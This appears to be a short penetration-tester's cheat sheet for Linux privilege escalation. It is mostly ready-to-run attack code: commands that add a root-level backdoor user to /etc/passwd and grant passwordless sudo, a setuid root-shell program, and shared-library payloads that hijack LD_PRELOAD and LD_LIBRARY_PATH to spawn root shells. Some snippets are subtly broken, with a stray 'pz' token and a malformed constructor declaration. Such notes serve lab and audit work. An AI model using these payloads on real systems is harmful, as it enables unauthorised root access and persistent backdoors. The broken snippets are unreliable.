# linux-privilege-escalation

## Password hijacking

```bash
# for /etc/passwd
openssl passwd <PASSWORD>
# kashz:kashz
echo 'kashz:cAZZtf3ncxRAY:0:0:root:/root:/bin/bash' >> /etc/passwd

# for /etc/shadow
python3 -c 'import crypt, getpass; print(crypt.crypt(getpass.getpass()))'

# for /etc/sudoers; sudo su
echo 'USER ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

## compile KE on kali

```bash
# sudo apt-get install gcc-multilib

# x86
gcc -m32 -Wl,--hash-style=both exploit.c -o exploit
```

## setuid.c

```c
// cat setuid.c
#include <unistd.h>

int main()
{
	setuid(0);
	setgid(0);
	execl("/bin/bash", "bash", (char *)NULL);
	return 0;
}

// find . -exec './setuid' \;
```

## .so shell

```c
// gcc -shared -fPIC -o kashz.so kashz.c
//[OR]
// gcc -c -fPIC -o test.o test.c
// gcc -shared -o test_this.so test.o

# file: kashz.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void hijack() __attribute__((constructor));
{
	setuid(0);
	setgid(0);
	system("/bin/sh");
	# [OR] execl("/bin/bash", "bash", (char *)NULL);
}
```

## LD_PRELOAD

```c
// sudo -l => env_keep+=LD_PRELOAD
// ldd <suid file>: prints shared libraries used by <SUID>

# nano preload.c
# include <stdio.h>
# include <sys/types.h>
# include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);pz
	system("/bin/bash -p");
}
// compile
// gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
// run any SUID
// sudo LD_PRELOAD=/tmp/preload.so <SUID>
```

## LD_LIBRARY_PATH

```c
// sudo -l => env_keep=LD_LIBRARY_PATH

# nano lib_path.c
# include <stdio.h>
# include <stdlib.h>
# include <sys/types.h>

static void hijack() __attribute__((constructor));
void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

// compile
// gcc -o <outFile> -shared -fPIC lib_path.c
// <outFile>: name of one of the shared files used by SUID (get using ldd command)
// run
// sudo LD_LIBRARY_PATH=. <SUID>
```
